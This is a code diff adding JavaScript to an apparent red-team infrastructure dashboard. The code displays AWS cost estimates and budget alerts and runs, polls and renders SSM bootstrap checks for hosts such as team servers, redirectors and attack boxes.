+                </tr>
+            </thead>
+            <tbody>${rows}</tbody>
+        </table>
+    `;
+}
+
+function renderCostErrors(data) {
+    // Remove any existing error callout
+    const existing = document.getElementById('cost-error-callout');
+    if (existing) existing.remove();
+
+    const actual = data.actual_costs || {};
+    const container = document.getElementById('cost-summary-cards');
+    if (!container) return;
+
+    let html = '';
+    if (actual.error === 'cost_explorer_not_enabled') {
+        html = `<div id="cost-error-callout" class="callout callout--warning" style="margin-top: 15px;">
+            <strong>AWS Cost Explorer not enabled.</strong> ${actual.error_message || ''}
+            <br><a href="https://console.aws.amazon.com/cost-management/home#/cost-explorer" target="_blank" style="color: inherit;">Enable Cost Explorer in AWS Console</a> — data appears after 24 hours. Showing estimates only.
+        </div>`;
+    } else if (actual.error === 'access_denied') {
+        html = `<div id="cost-error-callout" class="callout callout--warning" style="margin-top: 15px;">
+            <strong>Missing IAM permission.</strong> Add <code>ce:GetCostAndUsage</code> to your IAM policy. Showing estimates only.
+        </div>`;
+    } else if (actual.stale) {
+        html = `<div id="cost-error-callout" class="callout callout--info" style="margin-top: 15px;">
+            <strong>Stale data</strong> — cached from ${actual.cache_age_minutes} minutes ago. ${actual.error || ''}
+        </div>`;
+    } else if (actual.available && (!actual.daily_costs || actual.daily_costs.every(d => d.total === 0))) {
+        const est = data.estimated_costs || {};
+        const isActive = est.is_active;
+        const hoursRunning = est.hours_running || 0;
+
+        if (!isActive && hoursRunning > 0) {
+            // Destroyed project with no Cost Explorer data — likely deployed before tagging was added
+            html = `<div id="cost-error-callout" class="callout callout--info" style="margin-top: 15px;">
+                <strong>No Cost Explorer data for this project.</strong> Resources may not have been tagged with the <code>Project</code> tag during this engagement. Showing estimates calculated from instance types and uptime.
+            </div>`;
+        } else if (isActive && hoursRunning < 48) {
+            // New active deployment — Cost Explorer has 24-48h delay
+            html = `<div id="cost-error-callout" class="callout callout--info" style="margin-top: 15px;">
+                <strong>No actual cost data yet.</strong> AWS Cost Explorer data typically takes 24-48 hours to appear for new deployments. Showing estimates below.
+            </div>`;
+        } else if (isActive) {
+            // Active deployment past 48h with no data — tag mismatch
+            html = `<div id="cost-error-callout" class="callout callout--warning" style="margin-top: 15px;">
+                <strong>No Cost Explorer data found.</strong> Verify that deployed resources have the <code>Project</code> tag matching this project name. Showing estimates below.
+            </div>`;
+        }
+    }
+
+    if (html) {
+        container.insertAdjacentHTML('afterend', html);
+    }
+}
+
+function _aggregateServiceCosts(dailyCosts) {
+    const totals = {};
+    (dailyCosts || []).forEach(day => {
+        Object.entries(day.by_service || {}).forEach(([svc, amt]) => {
+            totals[svc] = (totals[svc] || 0) + amt;
+        });
+    });
+    return totals;
+}
+
+function _showCostEmptyState(show) {
+    const empty = document.getElementById('cost-empty-state');
+    const cards = document.getElementById('cost-summary-cards');
+    const budgetBar = document.getElementById('cost-budget-bar-section');
+    const trend = document.getElementById('cost-trend-section');
+    const breakdown = document.getElementById('cost-breakdown-section');
+
+    if (empty) empty.style.display = show ? 'block' : 'none';
+    if (cards) cards.style.display = show ? 'none' : '';
+    // These stay hidden until render functions explicitly show them with data
+    if (show) {
+        if (budgetBar) budgetBar.style.display = 'none';
+        if (trend) trend.style.display = 'none';
+        if (breakdown) breakdown.style.display = 'none';
+    }
+}
+
+/**
+ * Budget alert banner for Deployment Manager page.
+ * Lightweight — just fetches budget status and shows/hides a callout.
+ */
+async function loadBudgetAlert() {
+    const alertDiv = document.getElementById('cost-budget-alert');
+    if (!alertDiv) return;
+
+    try {
+        const resp = await fetch('/api/costs/budget-alert');
+        const data = await resp.json();
+
+        if (!data.success || !data.enabled || data.level === 'ok') {
+            alertDiv.style.display = 'none';
+            return;
+        }
+
+        const isOver = data.level === 'danger';
+        const cls = isOver ? 'callout--danger' : 'callout--warning';
+        const msg = isOver
+            ? `Budget Exceeded: Spending ($${data.total_spend.toFixed(2)}) has exceeded your $${data.threshold} monthly budget by $${Math.abs(data.remaining).toFixed(2)}.`
+            : `Budget Warning: ${data.used_percent.toFixed(0)}% of your $${data.threshold} monthly budget used ($${data.total_spend.toFixed(2)}).`;
+
+        alertDiv.innerHTML = `
+            <div class="callout ${cls}">
+                <strong>${isOver ? 'Budget Exceeded' : 'Budget Warning'}</strong> — ${msg}
+                <a href="#" onclick="APP.navigateTo('settings'); return false;" style="color: inherit; text-decoration: underline; margin-left: 8px;">View details in Settings</a>
+            </div>
+        `;
+        alertDiv.style.display = 'block';
+    } catch (e) {
+        alertDiv.style.display = 'none';
+    }
+}
+
+// ============================================================================
+// HOST SETUP CHECK (SSM-based bootstrap validation)
+// ============================================================================
+
+let _setupCheckPollTimer = null;
+
+/**
+ * Load cached setup check results from localStorage (lightweight, no SSM).
+ */
+async function loadCachedSetupCheck() {
+    const contentEl = document.getElementById('setup-check-content');
+    if (!contentEl) return;
+
+    // Try localStorage first
+    const activeSession = document.querySelector('[data-details-id$="-setup-check"]');
+    if (!activeSession) return;
+
+    const project = _getSetupCheckProject();
+    if (!project) return;
+
+    const cacheKey = `setupCheck_${project}`;
+    const cached = localStorage.getItem(cacheKey);
+    if (cached) {
+        try {
+            const data = JSON.parse(cached);
+            renderSetupCheckResults(data);
+        } catch (e) { /* ignore bad cache */ }
+        return;
+    }
+
+    // Try server cache
+    try {
+        const resp = await fetch(`${API_BASE}/setup-check/status?project=${encodeURIComponent(project)}`);
+        const data = await resp.json();
+        if (data.success && data.cached && data.hosts && data.hosts.length > 0) {
+            localStorage.setItem(cacheKey, JSON.stringify(data));
+            renderSetupCheckResults(data);
+        }
+    } catch (e) {
+        console.log('[SetupCheck] No cached results available');
+    }
+}
+
+/**
+ * Trigger a fresh SSM setup check.
+ */
+async function runSetupCheck() {
+    const contentEl = document.getElementById('setup-check-content');
+    const btn = document.getElementById('setup-check-btn');
+    if (!contentEl) return;
+
+    const project = _getSetupCheckProject();
+    if (!project) {
+        contentEl.innerHTML = '<p class="t-muted">No active deployment found.</p>';
+        return;
+    }
+
+    // Get region from per-project cache or use default
+    let region = 'eu-central-1';
+    try {
+        const pd = getProjectData(project);
+        if (pd && pd.outputs && pd.outputs.region) {
+            region = pd.outputs.region;
+        }
+    } catch (e) { /* use default */ }
+
+    if (btn) { btn.disabled = true; btn.textContent = 'Checking...'; }
+    contentEl.innerHTML = `
+        <div style="display: flex; align-items: center; gap: 8px; padding: 10px 0;">
+            <div style="width: 16px; height: 16px; border: 2px solid var(--accent); border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+            <span>Sending SSM commands to all instances... This may take 15-30 seconds.</span>
+        </div>`;
+
+    try {
+        const resp = await fetch(`${API_BASE}/setup-check/run`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ project, region }),
+        });
+        const data = await resp.json();
+        if (data.success && data.check_id) {
+            pollSetupCheck(data.check_id, project);
+        } else {
+            contentEl.innerHTML = `<p style="color: var(--error);">Failed to start check: ${data.error || 'Unknown error'}</p>`;
+            if (btn) { btn.disabled = false; btn.textContent = 'Check Setup'; }
+        }
+    } catch (e) {
+        contentEl.innerHTML = `<p style="color: var(--error);">Network error: ${e.message}</p>`;
+        if (btn) { btn.disabled = false; btn.textContent = 'Check Setup'; }
+    }
+}
+
+/**
+ * Poll for in-flight check results.
+ */
+function pollSetupCheck(checkId, project) {
+    if (_setupCheckPollTimer) clearTimeout(_setupCheckPollTimer);
+
+    const contentEl = document.getElementById('setup-check-content');
+    const btn = document.getElementById('setup-check-btn');
+
+    const doPoll = async () => {
+        try {
+            const resp = await fetch(`${API_BASE}/setup-check/poll?check_id=${encodeURIComponent(checkId)}`);
+            const data = await resp.json();
+
+            if (data.status === 'running') {
+                _setupCheckPollTimer = setTimeout(doPoll, 5000);
+                return;
+            }
+
+            // Complete
+            if (data.success && data.hosts) {
+                const cacheKey = `setupCheck_${project}`;
+                localStorage.setItem(cacheKey, JSON.stringify(data));
+                renderSetupCheckResults(data);
+            } else {
+                if (contentEl) contentEl.innerHTML = `<p style="color: var(--error);">Check failed: ${data.error || 'Unknown error'}</p>`;
+            }
+        } catch (e) {
+            if (contentEl) contentEl.innerHTML = `<p style="color: var(--error);">Poll error: ${e.message}</p>`;
+        }
+        if (btn) { btn.disabled = false; btn.textContent = 'Check Setup'; }
+    };
+
+    _setupCheckPollTimer = setTimeout(doPoll, 5000);
+}
+
+/**
+ * Render setup check results into the UI.
+ */
+function renderSetupCheckResults(data) {
+    const contentEl = document.getElementById('setup-check-content');
+    const badgeEl = document.getElementById('setup-check-badge');
+    const lastCheckedEl = document.getElementById('setup-check-last-checked');
+    const btn = document.getElementById('setup-check-btn');
+
+    if (!contentEl) return;
+    if (btn) { btn.disabled = false; btn.textContent = 'Check Setup'; }
+
+    const hosts = data.hosts || [];
+    const summary = data.summary || {};
+    const checkedAt = data.checked_at;
+
+    // Update badge
+    if (badgeEl && summary.total) {
+        const healthy = summary.healthy || 0;
+        const total = summary.total || 0;
+        let badgeColor = 'var(--success)';
+        if (healthy === 0) badgeColor = 'var(--error)';
+        else if (healthy < total) badgeColor = 'var(--warning)';
+        badgeEl.innerHTML = `<span style="background: ${badgeColor}; color: #fff; padding: 1px 8px; border-radius: 10px; font-size: 0.75em;">${healthy}/${total} healthy</span>`;
+    }
+
+    // Update last checked
+    if (lastCheckedEl && checkedAt) {
+        const d = new Date(checkedAt);
+        lastCheckedEl.textContent = `Last checked: ${d.toLocaleString()}`;
+    }
+
+    if (hosts.length === 0) {
+        contentEl.innerHTML = '<p style="color: var(--text-muted); font-style: italic;">No instances found.</p>';
+        return;
+    }
+
+    // Role display names
+    const roleLabels = {
+        'c2_server': 'Team Server', 'teamserver': 'Team Server',
+        'redirector': 'Redirector', 'bastion': 'Bastion',
+        'attackbox': 'Attack Box', 'attack_box': 'Attack Box',
+        'jumpbox': 'Jumpbox', 'dc': 'Domain Controller',
+    };
+
+    let html = '';
+    for (const host of hosts) {
+        const sd = host.setup_data;
+        const roleLabel = roleLabels[host.role] || host.role;
+
+        // Determine host-level icon and status
+        let icon, statusText, rowColor;
+        if (host.check_status === 'no_status_file') {
+            icon = '⏳'; statusText = 'Bootstrap not started yet'; rowColor = 'var(--text-muted)';
+        } else if (host.check_status === 'ssm_timeout') {
+            icon = '⚠️'; statusText = 'SSM timed out'; rowColor = 'var(--warning)';
+        } else if (host.check_status === 'ssm_send_failed' || host.check_status === 'ssm_error') {
+            icon = '🔘'; statusText = 'SSM not responding'; rowColor = 'var(--text-muted)';
+        } else if (host.check_status === 'ssm_failed') {
+            icon = '🔘'; statusText = host.message || 'Instance not reachable'; rowColor = 'var(--text-muted)';
+        } else if (host.check_status === 'parse_error') {
+            icon = '⚠️'; statusText = 'Could not parse status'; rowColor = 'var(--warning)';
+        } else if (sd) {
+            if (sd.status === 'complete') { icon = '✅'; statusText = ''; rowColor = 'var(--success)'; }
+            else if (sd.status === 'partial') { icon = '❌'; statusText = `${sd.failed} step(s) failed`; rowColor = 'var(--error)'; }
+            else if (sd.status === 'running') { icon = '🔄'; statusText = 'Setup running...'; rowColor = 'var(--accent)'; }
+            else { icon = '⚠️'; statusText = sd.status; rowColor = 'var(--warning)'; }
+        } else {
+            icon = '🔘'; statusText = host.message || 'Unknown'; rowColor = 'var(--text-muted)';
+        }
+
+        // Step count and duration
+        let stepInfo = '';
+        let durationInfo = '';
+        if (sd && sd.steps) {
+            const ok = sd.steps.filter(s => s.status === 'ok' || s.status === 'warning').length;
+            stepInfo = `${ok}/${sd.total_steps} steps`;
+            const totalSecs = sd.steps.reduce((sum, s) => sum + (s.duration_s || 0), 0);
+            if (totalSecs >= 60) {
+                durationInfo = `${Math.floor(totalSecs / 60)}m ${totalSecs % 60}s`;
+            } else {
+                durationInfo = `${totalSecs}s`;
+            }
+        }
+
+        // Build expandable step detail
+        let stepDetailHtml = '';
+        if (sd && sd.steps && sd.steps.length > 0) {
+            stepDetailHtml = '<div style="margin-top: 8px; padding-left: 24px;">';
+            for (const step of sd.steps) {
+                let sIcon = '✅';
+                if (step.status === 'failed') sIcon = '❌';
+                else if (step.status === 'warning') sIcon = '⚠️';
+                else if (step.status === 'skipped') sIcon = '⏭️';
+                else if (step.status === 'running') sIcon = '🔄';
+
+                const dur = step.duration_s != null ? `${step.duration_s}s` : '';
+                const msg = step.message ? `<span style="color: var(--error); font-size: 0.85em; margin-left: 8px;">${step.message}</span>` : '';
+                stepDetailHtml += `
+                    <div style="display: flex; align-items: center; gap: 6px; padding: 3px 0; font-size: 0.85em;">
+                        <span>${sIcon}</span>
+                        <span style="min-width: 20px; color: var(--text-muted);">${step.step}.</span>
+                        <span>${step.name}</span>
+                        <span style="color: var(--text-muted); margin-left: auto;">${dur}</span>
+                        ${msg}
+                    </div>`;
+            }
+            stepDetailHtml += '</div>';
+        }
+
+        const hasDetail = stepDetailHtml !== '';
+        html += `
+            <details style="margin-bottom: 4px; border-bottom: 1px solid var(--border); padding-bottom: 4px;">
+                <summary style="cursor: pointer; display: flex; align-items: center; gap: 8px; padding: 6px 0; list-style: none;">
+                    <span>${icon}</span>
+                    <strong style="flex: 1;">${host.name}</strong>
+                    <span style="background: var(--bg-section); padding: 1px 6px; border-radius: 4px; font-size: 0.75em; color: var(--text-muted);">${roleLabel}</span>
+                    ${stepInfo ? `<span style="font-size: 0.8em; color: var(--text-secondary);">${stepInfo}</span>` : ''}
+                    ${durationInfo ? `<span style="font-size: 0.8em; color: var(--text-muted);">${durationInfo}</span>` : ''}
+                    ${statusText ? `<span style="font-size: 0.8em; color: ${rowColor};">${statusText}</span>` : ''}
+                </summary>
+                ${hasDetail ? stepDetailHtml : '<div style="padding: 6px 0 6px 24px; font-size: 0.85em; color: var(--text-muted);">No step details available</div>'}
+            </details>`;
+    }
+
+    contentEl.innerHTML = html;
+}
+
+/**
+ * Get the project name for setup check from the current session context.
+ */
+function _getSetupCheckProject() {
+    // Try the current deployment project
+    if (window.currentDeploymentProject) return window.currentDeploymentProject;
+
+    // Try per-project cache — return first cached project name
+    try {
+        const keys = Object.keys(projectDataCache);
+        if (keys.length > 0) return keys[0];
+    } catch (e) { /* ignore */ }
+
+    // Try sessionStorage
+    const stored = sessionStorage.getItem('activeDeploymentProject');
+    if (stored) return stored;
+
+    // Try to extract from session details card
+    const cards = document.querySelectorAll('[data-details-id]');
+    for (const card of cards) {
+        const id = card.getAttribute('data-details-id') || '';
+        if (id.endsWith('-setup-check')) {
+            const sessionId = id.replace('-setup-check', '');
+            const resourceDiv = document.getElementById(`${sessionId}-resources`);
+            if (resourceDiv) {
+                const loadBtn = resourceDiv.querySelector('button[onclick*="loadProjectResources"]');
+                if (loadBtn) {
+                    const match = loadBtn.getAttribute('onclick').match(/loadProjectResources\('([^']+)'/);
+                    if (match) return match[1];
+                }
+            }
+        }
+    }
+    return null;
+}
+
+// ============================================================================
 // APPLICATION INITIALIZATION
 // ============================================================================
 
 document.addEventListener('DOMContentLoaded', () => {
     APP.init();
+});
+
+// Save beacon history on page unload
+window.addEventListener('beforeunload', () => {
+    if (BEACON.selectedBid) BEACON._saveHistory(BEACON.selectedBid);
 });
